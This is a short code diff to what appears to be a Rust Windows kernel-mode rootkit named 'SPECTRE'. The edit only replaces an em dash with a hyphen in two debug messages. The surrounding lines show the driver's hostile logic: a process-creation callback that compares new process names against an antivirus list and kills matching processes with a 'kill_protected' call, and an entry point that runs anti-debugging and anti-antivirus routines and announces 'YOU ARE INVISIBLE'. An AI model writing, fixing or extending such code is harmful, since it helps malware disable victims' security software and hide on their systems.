@@ -294,7 +294,7 @@ unsafe extern "system" fn av_killer_callback(_parent: HANDLE, pid: HANDLE, creat
     if !name_ptr.is_null() {
         for av_name in AV_LIST {
             if string_compare(name_ptr as *const u8, av_name.as_ptr()) {
-                DbgPrint(b"[SPECTRE] AV Detected: %s \u2014 Killing!\n\0".as_ptr() as *const c_char, name_ptr);
+                DbgPrint(b"[SPECTRE] AV Detected: %s - Killing!\n\0".as_ptr() as *const c_char, name_ptr);
                 kill_protected(pid);
                 break;
             }
@@ -510,7 +510,7 @@ pub extern "system" fn DriverEntry(
         anti_debug_check();
         anti_av_activate();
 
-        DbgPrint(b"[SPECTRE] ALL SYSTEMS ACTIVE \u2014 YOU ARE INVISIBLE\n\0".as_ptr() as *const c_char);
+        DbgPrint(b"[SPECTRE] ALL SYSTEMS ACTIVE - YOU ARE INVISIBLE\n\0".as_ptr() as *const c_char);
         STATUS_SUCCESS
     }
 }
